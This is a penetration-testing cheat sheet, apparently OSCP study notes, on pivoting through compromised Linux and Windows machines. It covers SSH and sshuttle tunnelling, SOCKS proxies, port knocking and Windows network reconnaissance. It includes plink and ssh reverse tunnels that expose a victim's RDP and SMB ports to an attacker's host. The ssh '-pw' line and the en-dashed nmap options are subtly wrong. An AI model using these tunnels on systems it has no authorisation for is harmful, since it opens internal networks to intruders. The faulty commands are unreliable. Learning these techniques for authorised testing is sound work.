# Pivot with a Linux machine compromised

## SSHUTTLE

* https://github.com/sshuttle/sshuttle

```
sshuttle -vvr user@10.10.10.10 10.1.1.0/24
```

## SSH

**Local Port Forward**
```
ssh <gateway> -L <localport>:<remote host>:<remote port>
```

**Remote Port Forward**
```
ssh <gateway> -R <remote port>:<local host>:<local port>
```

**SOCKs Proxy**
```
ssh username@host -D <local proxy port> -p <remote port> <target ip>
```

`-nNT` - do not allocate tty

`proxychains` - used to send any processes traffic through a SOCKs proxy defaults to port 9050

`HTTPTunnel` or `stunnel` - tunnel any traffic through HTTP or SSL

## Port knock

```
for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x server_ip_address; done
```

# Pivot with a Windows machine compromised

## Look for connections to other hosts

```
Arp -a  
netstat -abno 
ipconfig /all 
route print 
schtasks /query /fo LIST /v 
netsh firewall show config
```

## plink

For example to expose RDP, on the target run:
```
plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>
```

## SSH

As of Windows 10 1803 (April 2018 Update), ssh client is now included and turned on by default:
```
ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
```

## Remote Desktop

Remote Desktop for windows with share and 85% screen:
```
rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.10.10.10
```

# References

* https://0xdarkvortex.dev/index.php/2018/04/17/31-days-of-oscp-experience/
* https://ben.the-collective.net/oscp-notes/pivoting/
* https://paper.dropbox.com/doc/OSCP-Methodology-EnVX7VSiNGZ2K2QxCZD7Q